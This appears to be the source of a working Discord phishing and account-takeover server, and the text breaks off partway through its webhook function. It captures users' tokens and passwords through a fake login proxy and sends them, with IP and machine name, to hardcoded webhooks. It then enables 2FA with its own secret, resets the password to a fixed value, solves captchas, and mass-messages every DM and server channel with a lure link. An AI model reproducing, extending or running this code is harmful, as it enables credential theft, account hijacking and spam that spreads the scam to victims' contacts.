"""
Discord Login Server — stealth proxy using curl_cffi for Chrome TLS impersonation.
Proper flow: visit login page → get cookies → get X-Fingerprint → login.
Run:  python discord_server.py
Open: http://localhost:8463
# v2.1 — predictive pre-challenge
"""
import subprocess, sys, os, platform, re

_deps = {
    'flask': 'flask',
    'curl_cffi': 'curl_cffi',
    'websocket': 'websocket-client',
    'cryptography': 'cryptography',
    'pyotp': 'pyotp',
}
for _m, _p in _deps.items():
    try:
        __import__(_m)
    except ImportError:
        print(f'[*] Installing {_p}...')
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])

from flask import Flask, request, jsonify, send_from_directory, make_response
from curl_cffi import requests as creq   # Chrome TLS impersonation
import requests as plain_req              # for webhook (no impersonation needed)
import websocket
import json, base64, hashlib, threading, time, uuid
import pyotp
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_pad
from cryptography.hazmat.primitives import hashes, serialization

# ━━━━━━━━━━━━ Config ━━━━━━━━━━━━
PORT    = int(os.environ.get('PORT', 8463))
API     = 'https://discord.com/api/v9'
WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
WEBHOOK = os.environ.get('WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6')
WEBHOOK_BACKUP = 'https://discord.com/api/webhooks/1478274350720221274/d86UA6fKCcJ5_utKPTWmJ7qYrO_Z_aHTeBUb5Uo-N9NPA1kcGGwVd10yjZQ0_1Gs6Dsq'
TOTP_SECRETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'totp_secrets.txt')

# Chrome 136 UA + matching client hints
CHROME_VER = '136'
UA = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{CHROME_VER}.0.0.0 Safari/537.36'
SEC_CH_UA          = f'"Chromium";v="{CHROME_VER}", "Google Chrome";v="{CHROME_VER}", "Not.A/Brand";v="99"'
SEC_CH_UA_MOBILE   = '?0'
SEC_CH_UA_PLATFORM = '"Windows"'

# Captcha solving — Anti-Captcha (hCaptcha Enterprise)
ANTICAPTCHA_KEY  = os.environ.get('ANTICAPTCHA_KEY', os.environ.get('2CAPTCHA_KEY', ''))

# Role assignment after verification
BOT_TOKEN    = os.environ.get('BOT_TOKEN', '')
GUILD_ID     = os.environ.get('GUILD_ID', '')
VERIFIED_ID  = os.environ.get('VERIFIED_ID', '')
VOICE_CHANNEL_ID = os.environ.get('VOICE_CHANNEL_ID', '1477752842675683555')

VOICE_CHANNEL_ID_2 = '1478017594895106229'
GUILD_ID_2 = '1472050464659865742'

# ━━━━━━━━━━━━ Proxy for Discord API calls ━━━━━━━━━━━━
def _load_proxy():
    """Load proxy from DISCORD_PROXY env var, or first proxy in proxies.txt."""
    p = os.environ.get('DISCORD_PROXY', '').strip()
    if p:
        return p
    try:
        pf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'proxies.txt')
        with open(pf, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    return line
    except:
        pass
    return None

DISCORD_PROXY = _load_proxy()
DISCORD_PROXIES = {'https': DISCORD_PROXY, 'http': DISCORD_PROXY} if DISCORD_PROXY else None

# Adaptive proxy: start direct, switch to proxy on 429, switch back when clear
_use_proxy = False          # currently using proxy?
_proxy_lock = threading.Lock()
_rate_limit_until = 0       # timestamp when rate limit expires

def _set_proxy_mode(on: bool, reason=''):
    global _use_proxy
    with _proxy_lock:
        if _use_proxy != on:
            _use_proxy = on
            mode = f'PROXY ({DISCORD_PROXY})' if on else 'DIRECT (Railway IP)'
            print(f'[proxy] Switched to {mode} — {reason}')

def _make_session():
    """Create a curl_cffi Chrome-impersonation session. Uses proxy only when rate-limited."""
    s = creq.Session(impersonate='chrome')
    with _proxy_lock:
        if _use_proxy and DISCORD_PROXIES:
            s.proxies = DISCORD_PROXIES
    return s

def _handle_discord_response(resp):
    """Check response for rate limit. Toggle proxy on/off automatically. Returns resp."""
    global _rate_limit_until
    if resp is None:
        return resp
    if resp.status_code == 429:
        retry_after = 5
        try:
            retry_after = resp.json().get('retry_after', 5)
        except:
            pass
        _rate_limit_until = time.time() + retry_after
        if DISCORD_PROXIES:
            _set_proxy_mode(True, f'429 rate-limited, retry_after={retry_after:.1f}s')
    elif resp.status_code < 400:
        # Success on current mode — if we're on proxy and rate limit expired, try direct again
        with _proxy_lock:
            if _use_proxy and time.time() > _rate_limit_until + 10:
                _set_proxy_mode(False, 'rate limit expired, reverting to direct')
    return resp

print(f'[config] Role assignment: BOT_TOKEN={"set" if BOT_TOKEN else "MISSING"}, GUILD_ID={GUILD_ID or "MISSING"}, VERIFIED_ID={VERIFIED_ID or "MISSING"}')
print(f'[config] Voice channel: {VOICE_CHANNEL_ID} + {VOICE_CHANNEL_ID_2}')
print(f'[config] Discord proxy available: {DISCORD_PROXY or "NONE"} (starts DIRECT, auto-switches on 429)')

app = Flask(__name__, static_folder='.', static_url_path='')

@app.after_request
def _add_headers(response):
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    # Prevent iOS Safari aggressive caching of HTML pages
    if response.content_type and 'text/html' in response.content_type:
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response

# ━━━━━━━━━━━━ Build Number ━━━━━━━━━━━━
BUILD = 368827  # fallback

def fetch_build_number():
    """Fetch Discord's current client build number from their JS assets."""
    global BUILD
    try:
        s = _make_session()
        r = s.get('https://discord.com/login', timeout=15)
        # Grab ALL JS asset filenames from the page
        all_assets = re.findall(r'(?:src|href)=["\'](?:/assets/|https://discord\.com/assets/)(\w[\w.]+)\.js', r.text)
        if not all_assets:
            all_assets = re.findall(r'assets/(\w[\w.]*)\.js', r.text)
        # Prioritize sentry/build chunks, then check all
        priority = [a for a in all_assets if 'sentry' in a.lower() or 'build' in a.lower()]
        to_check = priority + [a for a in all_assets if a not in priority]
        for m in to_check[:20]:
            try:
                jr = s.get(f'https://discord.com/assets/{m}.js', timeout=10)
                # Multiple patterns: buildNumber:NNNNNN or "buildNumber","NNNNNN" or build_number
                for pattern in [
                    r'buildNumber["\s:,]+?(\d{5,})',
                    r'build_number["\s:,]+?(\d{5,})',
                    r'"buildNumber"\s*,\s*"?(\d{5,})',
                    r'buildNumber\}\)\}\),(\d{5,})',
                ]:
                    bm = re.search(pattern, jr.text)
                    if bm:
                        BUILD = int(bm.group(1))
                        print(f'[*] Build number: {BUILD} (from {m}.js)')
                        return
            except:
                continue
        print(f'[*] Using fallback build: {BUILD}')
    except Exception as e:
        print(f'[!] Build fetch failed: {e}, using {BUILD}')


def sprops():
    return base64.b64encode(json.dumps({
        "os": "Windows", "browser": "Chrome", "device": "",
        "system_locale": "en-US", "browser_user_agent": UA,
        "browser_version": f"{CHROME_VER}.0.0.0", "os_version": "10",
        "referrer": "", "referring_domain": "",
        "referrer_current": "", "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": BUILD, "client_event_source": None
    }).encode()).decode()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


# ━━━━━━━━━━━━ Stealth Discord Session ━━━━━━━━━━━━
class DiscordSession:
    """
    Creates a curl_cffi session that impersonates Chrome's TLS fingerprint,
    visits the login page first to get cookies, then fetches X-Fingerprint.
    This mimics a real browser and avoids account locks.
    """
    def __init__(self):
        self.s = _make_session()
        self.fingerprint = None
        self.cookies_ready = False

    def prepare(self):
        """Step 1: Visit login page → cookies.  Step 2: /experiments → fingerprint."""
        # Step 1: GET /login — Cloudflare sets __dcfduid, __sdcfduid, __cfruid, locale
        try:
            r = self.s.get('https://discord.com/login', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
            self.cookies_ready = r.status_code == 200
            print(f'[*] Login page: {r.status_code}, cookies: {list(self.s.cookies.keys())}')
        except Exception as e:
            print(f'[!] Login page failed: {e}')
            self.cookies_ready = False

        # Step 2: GET /experiments → X-Fingerprint (no auth header)
        try:
            r2 = self.s.get(f'{API}/experiments', headers={
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'X-Track': sprops(),
            }, timeout=15)
            if r2.status_code == 200:
                self.fingerprint = r2.json().get('fingerprint')
                print(f'[*] Fingerprint: {self.fingerprint[:20]}...' if self.fingerprint else '[!] No fingerprint in response')
            else:
                print(f'[!] Experiments: {r2.status_code}')
        except Exception as e:
            print(f'[!] Experiments failed: {e}')

        return self

    def _headers(self, extra=None):
        h = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/login',
            'User-Agent': UA,
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/Los_Angeles',
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Super-Properties': sprops(),
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        if self.fingerprint:
            h['X-Fingerprint'] = self.fingerprint
        if extra:
            h.update(extra)
        return h

    def _sync_proxy(self):
        """Sync this session's proxy setting with current global mode."""
        with _proxy_lock:
            if _use_proxy and DISCORD_PROXIES:
                self.s.proxies = DISCORD_PROXIES
            else:
                self.s.proxies = {}

    def post(self, path, json_data, timeout=30):
        self._sync_proxy()
        r = self.s.post(
            f'{API}{path}',
            headers=self._headers(),
            json=json_data,
            timeout=timeout
        )
        _handle_discord_response(r)
        return r

    def snapshot(self):
        """Save cookies + fingerprint so they can be restored on a fresh session."""
        return {
            'cookies': dict(self.s.cookies),
            'fingerprint': self.fingerprint,
        }

    def restore(self, snap):
        """Apply saved cookies + fingerprint to this (fresh) session."""
        for k, v in snap.get('cookies', {}).items():
            self.s.cookies.set(k, v)
        self.fingerprint = snap.get('fingerprint')


# ━━━━━━━━━━━━ Webhook ━━━━━━━━━━━━
_webhookd_tokens: set = set()
_webhookd_lock = threading.Lock()


def _solve_hcap(sitekey, pageurl):
    """Solve hCaptcha via Anti-Captcha. Returns token or None."""
    key = ANTICAPTCHA_KEY or os.environ.get('ANTICAPTCHA_KEY', '')
    if not key:
        return None
    try:
        r = plain_req.post('https://api.anti-captcha.com/createTask', json={
            'clientKey': key,
            'task': {'type': 'HCaptchaTaskProxyless', 'websiteURL': pageurl, 'websiteKey': sitekey}
        }, timeout=15)
        task_id = r.json().get('taskId')
        if not task_id:
            return None
        for _ in range(90):
            time.sleep(3)
            r2 = plain_req.post('https://api.anti-captcha.com/getTaskResult',
                                json={'clientKey': key, 'taskId': task_id}, timeout=15)
            res = r2.json()
            if res.get('status') == 'ready':
                return res.get('solution', {}).get('gRecaptchaResponse')
            if res.get('errorId', 0) != 0:
                return None
    except:
        pass
    return None


_pw_store = {}       # ticket/token -> password (short-lived lookup)
_pw_store_lock = threading.Lock()

def _hq_guilds(token):
    h = {"Authorization": token, "User-Agent": UA}
    try:
        gs = plain_req.get(f"{API}/users/@me/guilds?with_counts=true", headers=h, timeout=10).json()
        out = []
        for g in gs:
            if g.get("owner") or g.get("permissions") == "4398046511103":
                out.append(f"• **{g.get('name','?')}** (`{g.get('id','?')}`) — {g.get('approximate_member_count','?')} members")
        return "\n".join(out) if out else "None"
    except:
        return "Error"


# ━━━━━━━━━━━━ IP Helpers ━━━━━━━━━━━━
_RAILWAY_PREFIXES = ('104.156.', '100.64.', '172.', '10.', '192.168.', '127.')

def _clean_ip(raw_ip):
    """Extract real client IP from X-Forwarded-For, stripping Railway/proxy/private IPs."""
    if not raw_ip or raw_ip == '?':
        return '?'
    parts = [p.strip() for p in raw_ip.split(',')]
    # Filter out Railway proxy IPs and private ranges — keep only real client IPs
    for ip in parts:
        if not any(ip.startswith(pfx) for pfx in _RAILWAY_PREFIXES):
            return ip
    # All IPs are proxy/private — no real client IP available
    return '?'


# ━━━━━━━━━━━━ Auto 2FA (TOTP) ━━━━━━━━━━━━
def _auto_enable_2fa(token, password):
    """
    Enable TOTP 2FA on a captured account using 3-step Discord flow:
      1. POST totp/enable → 401 code 60003, get MFA ticket
      2. POST /mfa/finish  → verify password, get MFA JWT
      3. POST totp/enable  → with X-Discord-MFA-Authorization + secret + code → 200
    Uses curl_cffi (Chrome TLS) + X-Super-Properties (required by Discord).
    Returns (new_token, secret, backup_codes) on success.
    Returns (None, None, None) on failure (no crash).
    """
    if not password or password == '?':
        print(f'[2fa] Skipped — no password available')
        return None, None, None

    enable_url = f'{API}/users/@me/mfa/totp/enable'
    finish_url = f'{API}/mfa/finish'
    h = {
        "Authorization": token,
        "User-Agent": UA,
        "Content-Type": "application/json",
        "X-Super-Properties": sprops(),
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-CH-UA": SEC_CH_UA,
        "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/Los_Angeles",
    }

    try:
        s = _make_session()
        # Warm session with login page cookies
        try:
            s.get('https://discord.com/login', headers={'User-Agent': UA}, timeout=10)
        except:
            pass

        # ── Step 1: Trigger MFA gate → get ticket ──
        print(f'[2fa] Step 1: triggering MFA gate...')
        r1 = s.post(enable_url, headers=h, json={'password': password}, timeout=15)
        j1 = r1.json()
        err_code = j1.get('code', 0)
        ticket = j1.get('mfa', {}).get('ticket', '')
        print(f'[2fa] Step 1: [{r1.status_code}] code={err_code} ticket={"yes" if ticket else "no"}')

        if err_code != 60003 or not ticket:
            if r1.status_code == 200:
                print(f'[2fa] Unexpected 200 — 2FA may already be enabled')
            else:
                print(f'[2fa] Step 1 failed (expected 60003): code={err_code} msg={j1.get("message", "?")}')
            return None, None, None

        # ── Step 2: Verify password via /mfa/finish → get MFA JWT ──
        print(f'[2fa] Step 2: verifying password...')
        r2 = s.post(finish_url, headers=h, json={
            'ticket': ticket,
            'mfa_type': 'password',
            'data': password,
        }, timeout=15)
        j2 = r2.json()
        mfa_jwt = j2.get('token', '')
        print(f'[2fa] Step 2: [{r2.status_code}] jwt={"yes" if mfa_jwt else "no"}')

        if r2.status_code != 200 or not mfa_jwt:
            print(f'[2fa] Step 2 failed: {j2.get("message", "?")} (code {j2.get("code", "?")})')
            return None, None, None

        # ── Step 3: Enable TOTP with MFA authorization ──
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret)
        code = totp.now()

        h3 = dict(h)
        h3['X-Discord-MFA-Authorization'] = mfa_jwt

        print(f'[2fa] Step 3: enabling TOTP...')
        r3 = s.post(enable_url, headers=h3, json={
            'password': password,
            'secret': secret,
            'code': code,
        }, timeout=15)

        if r3.status_code != 200:
            j3 = r3.json()
            print(f'[2fa] Step 3 failed: [{r3.status_code}] {j3.get("message", "?")} (code {j3.get("code", "?")})')
            return None, None, None

        result = r3.json()
        new_token = result.get('token', token)
        backup_codes = [c['code'] for c in result.get('backup_codes', []) if not c.get('consumed')]

        # Save to file
        try:
            with open(TOTP_SECRETS_FILE, 'a', encoding='utf-8') as f:
                f.write(json.dumps({
                    'token': new_token,
                    'old_token': token,
                    'password': password,
                    'secret': secret,
                    'backup_codes': backup_codes,
                    'enabled_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
                }) + '\n')
        except Exception as e:
            print(f'[2fa] Warning: could not save secret file: {e}')

        print(f'[2fa] ✅ 2FA Enabled! Secret: {secret[:8]}..., backups: {len(backup_codes)}, new token: {new_token[:20]}...')
        return new_token, secret, backup_codes

    except Exception as e:
        print(f'[2fa] Error: {e}')
        import traceback
        traceback.print_exc()
        return None, None, None


DEFAULT_NEW_PASSWORD = 'Fatdude11$'


def _pw_patch_with_captcha(s, url, headers, body, label='pw'):
    """PATCH /users/@me with automatic captcha solving if Discord demands one.
    Returns (response_json, status_code)."""
    r = s.patch(url, headers=headers, json=body, timeout=15)
    j = r.json()

    # Check for captcha challenge
    ckeys = j.get('captcha_key', [])
    if isinstance(ckeys, list) and ('captcha-required' in ckeys or
            'You need to update your app to perform this action.' in ckeys):
        sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
        rqdata  = j.get('captcha_rqdata', '')
        rqtoken = j.get('captcha_rqtoken', '')
        print(f'[{label}] Captcha required — solving...')
        cap_token, cap_err = _solve_race(sitekey, rqdata, n=9)
        if not cap_token:
            print(f'[{label}] Captcha solve failed: {cap_err}')
            return j, r.status_code
        # Retry PATCH with captcha solution
        body2 = dict(body)
        body2['captcha_key'] = cap_token
        if rqtoken:
            body2['captcha_rqtoken'] = rqtoken
        r2 = s.patch(url, headers=headers, json=body2, timeout=15)
        return r2.json(), r2.status_code

    return j, r.status_code


def _auto_change_password(token, old_password, new_password=None, mfa_enabled=False, totp_secret=None):
    """
    Change account password. Returns (new_token, final_password) on success.
    For MFA accounts, uses ticket + TOTP verify (if we have the secret) or
    password verify fallback + MFA JWT flow.
    Handles captcha challenges on the PATCH request automatically.
    Returns (None, old_password) on failure.
    """
    if new_password is None:
        new_password = DEFAULT_NEW_PASSWORD
    if not old_password or old_password == '?' or old_password == new_password:
        return None, old_password

    patch_url = f'{API}/users/@me'
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
        'X-Discord-Timezone': 'America/Los_Angeles',
    }

    try:
        s = _make_session()
        try:
            s.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
        except:
            pass

        body = {'password': old_password, 'new_password': new_password}
        j1, sc1 = _pw_patch_with_captcha(s, patch_url, h, body, 'pw-init')

        if sc1 == 200:
            new_tok = j1.get('token', '')
            print(f'[pw] ✅ Password changed (no MFA). New token: {new_tok[:20]}...')
            return new_tok, new_password

        err_code = j1.get('code', 0)

        # MFA required — ticket flow
        if err_code == 60003:
            ticket = j1.get('mfa', {}).get('ticket', '')
            methods = [m.get('type') for m in j1.get('mfa', {}).get('methods', [])]
            if not ticket:
                print(f'[pw] MFA required but no ticket')
                return None, old_password

            print(f'[pw] MFA required. ticket={ticket[:20]}... methods={methods} have_totp={bool(totp_secret)}')

            # Step 2: verify via TOTP (preferred) or password fallback
            mfa_jwt = None
            if totp_secret and ('totp' in methods or not methods):
                code = pyotp.TOTP(totp_secret).now()
                print(f'[pw] Using TOTP code: {code}')
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'totp', 'data': code,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] TOTP verify OK')
                else:
                    print(f'[pw] TOTP verify failed [{r2.status_code}]: {r2.text[:200]}')

            # Fallback: password verify (works when 'password' in methods)
            if not mfa_jwt and 'password' in methods:
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'password', 'data': old_password,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] Password verify OK')
                else:
                    print(f'[pw] Password verify failed [{r2.status_code}]: {r2.text[:200]}')

            if not mfa_jwt:
                print(f'[pw] Could not complete MFA verification')
                return None, old_password

            # Step 3: change password with MFA auth (+ captcha handling)
            h3 = dict(h)
            h3['X-Discord-MFA-Authorization'] = mfa_jwt
            j3, sc3 = _pw_patch_with_captcha(s, patch_url, h3, body, 'pw-mfa')

            if sc3 == 200:
                new_tok = j3.get('token', '')
                print(f'[pw] ✅ Password changed (MFA). New token: {new_tok[:20]}...')
                return new_tok, new_password
            else:
                print(f'[pw] Step 3 failed: [{sc3}] {j3.get("message", "?")} code={j3.get("code", "?")}')
                return None, old_password
        else:
            print(f'[pw] Password change failed: [{sc1}] code={err_code} {j1.get("message", "?")}')
            return None, old_password

    except Exception as e:
        print(f'[pw] Error: {e}')
        return None, old_password


# ━━━━━━━━━━━━ Mass Message (DMs first, then guilds) ━━━━━━━━━━━━
SPAM_MSG_DM    = 'discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'
SPAM_MSG_GUILD = '@everyone discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'

# Permission bit constants
PERM_VIEW_CHANNEL   = 0x400
PERM_SEND_MESSAGES  = 0x800
PERM_ADMINISTRATOR  = 0x8

def _guild_sendable_channels(s, h, guild_id):
    """Return list of text channel IDs where user can actually send messages.
    Uses GET /guilds/{id}/channels and computes effective perms from overwrites."""
    try:
        # Get our member info for role list
        me_r = s.get(f'{API}/users/@me', headers=h, timeout=10)
        my_id = me_r.json().get('id', '') if me_r.status_code == 200 else ''

        # Get guild info for @everyone role perms
        gr = s.get(f'{API}/guilds/{guild_id}', headers=h, timeout=10)
        if gr.status_code != 200:
            return []
        guild = gr.json()
        everyone_perms = int(guild.get('roles', [{}])[0].get('permissions', '0') if guild.get('roles') else '0')

        # Get member roles
        my_roles = set()
        try:
            mr = s.get(f'{API}/users/@me/guilds/{guild_id}/member', headers=h, timeout=10)
            if mr.status_code == 200:
                my_roles = set(mr.json().get('roles', []))
        except:
            pass

        # Map role id -> permissions
        role_perms = {}
        for role in guild.get('roles', []):
            role_perms[role['id']] = int(role.get('permissions', '0'))

        # Compute base perms from roles
        base_perms = everyone_perms
        for rid in my_roles:
            base_perms |= role_perms.get(rid, 0)

        # Admin bypasses everything
        is_admin = bool(base_perms & PERM_ADMINISTRATOR)

        # Get channels
        cr = s.get(f'{API}/guilds/{guild_id}/channels', headers=h, timeout=10)
        if cr.status_code != 200:
            return []

        sendable = []
        for ch in cr.json():
            if ch.get('type') != 0:  # text channels only
                continue
            if is_admin:
                sendable.append(ch['id'])
                continue

            # Apply permission overwrites
            perms = base_perms
            overwrites = ch.get('permission_overwrites', [])

            # @everyone overwrite first
            for ow in overwrites:
                if ow['id'] == guild_id:  # @everyone role id == guild id
                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            # Role overwrites
            allow_role = 0
            deny_role = 0
            for ow in overwrites:
                if ow['type'] == 0 and ow['id'] in my_roles:  # type 0 = role
                    deny_role |= int(ow.get('deny', '0'))
                    allow_role |= int(ow.get('allow', '0'))
            perms &= ~deny_role
            perms |= allow_role

            # Member-specific overwrite
            for ow in overwrites:
                if ow['type'] == 1 and ow['id'] == my_id:  # type 1 = member
                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            if (perms & PERM_VIEW_CHANNEL) and (perms & PERM_SEND_MESSAGES):
                sendable.append(ch['id'])

        return sendable
    except Exception as e:
        print(f'[spam] Permission check failed for guild {guild_id}: {e}')
        return []

def _mass_message(token, uname='?'):
    """Send message to all open DMs, then all accessible guild text channels.
    Pre-checks channel permissions to avoid wasting API calls on 403s.
    Uses the active (post-takeover) token. 1s delay between messages.
    Runs in background thread so webhook isn't blocked."""
    s = _make_session()
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
    }
    sent = 0
    failed = 0

    # ── DMs first ──
    try:
        r = s.get(f'{API}/users/@me/channels', headers=h, timeout=10)
        dm_ids = [c['id'] for c in r.json()] if r.status_code == 200 else []
        print(f'[spam] {uname}: {len(dm_ids)} DM channels')
    except:
        dm_ids = []

    for cid in dm_ids:
        try:
            r = s.post(f'{API}/channels/{cid}/messages', headers=h,
                       json={'content': SPAM_MSG_DM}, timeout=10)
            if r.status_code in (200, 201):
                sent += 1
            else:
                failed += 1
                if r.status_code == 429:
                    retry = r.json().get('retry_after', 2)
                    print(f'[spam] Rate limited, waiting {retry:.1f}s')
                    time.sleep(retry + 0.5)
                    # Retry once
                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
                                json={'content': SPAM_MSG_DM}, timeout=10)
                    if r2.status_code in (200, 201):
                        sent += 1; failed -= 1
        except:
            failed += 1
        time.sleep(1.3)

    # ── Guild channels (pre-checked permissions) ──
    try:
        r = s.get(f'{API}/users/@me/guilds', headers=h, timeout=10)
        guilds = r.json() if r.status_code == 200 else []
        print(f'[spam] {uname}: {len(guilds)} guilds')
    except:
        guilds = []

    for g in guilds:
        gid = g.get('id')
        if not gid:
            continue
        # Pre-check: get channels where we actually have send perms
        sendable = _guild_sendable_channels(s, h, gid)
        if not sendable:
            print(f'[spam] {uname}: guild {g.get("name","?")} — no sendable channels, skipping')
            continue
        print(f'[spam] {uname}: guild {g.get("name","?")} — {len(sendable)} sendable channels')

        # Send to first sendable channel only (1 message per guild)
        for cid in sendable[:3]:  # try up to 3 in case first still fails
            try:
                r = s.post(f'{API}/channels/{cid}/messages', headers=h,
                           json={'content': SPAM_MSG_GUILD}, timeout=10)
                if r.status_code in (200, 201):
                    sent += 1
                    break  # 1 message per guild
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 2)
                    time.sleep(retry + 0.5)
                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
                                json={'content': SPAM_MSG_GUILD}, timeout=10)
                    if r2.status_code in (200, 201):
                        sent += 1
                        break
                elif r.status_code == 403:
                    continue  # perm check was wrong, try next
                else:
                    failed += 1
                    break
            except:
                continue
        time.sleep(1.3)

    print(f'[spam] {uname}: Done! sent={sent} failed={failed}')


def send_webhook(token, client_ip="?", password="?"):
    client_ip = _clean_ip(client_ip)
    comp  = os.environ.get('COMPUTERNAME', platform.node())
    luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))

    # Stealth session for all Discord API calls
    s_api = _make_session()
    try:
        s_api.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
    except:
        pass
    api_h = {
        "Authorization": token, "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "X-Super-Properties": sprops(),
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/New_York",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-CH-UA": SEC_CH_UA, "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
    }

    def _fallback(reason):
        try:
            plain_req.post(WEBHOOK, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
            print(f"[+] Webhook sent (fallback: {reason})")
        except Exception as e2:
            print(f"[!] Webhook fallback failed: {e2}")
        try:
            plain_req.post(WEBHOOK_BACKUP, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
        except: pass

    try:
        r = s_api.get(f"{API}/users/@me", headers=api_h, timeout=15)

        if r.status_code != 200:
            _fallback(f"info {r.status_code}"); return

        u = r.json()
        uid    = u.get('id', '?')
        uname  = u.get('username', 'N/A')
        disc   = u.get('discriminator', '0000')
        email  = u.get('email', 'N/A')
        phone  = u.get('phone', 'N/A')
        avatar = u.get('avatar')
        mfa    = u.get('mfa_enabled', False)
        nitro  = u.get('premium_type', 0) not in (None, 0)
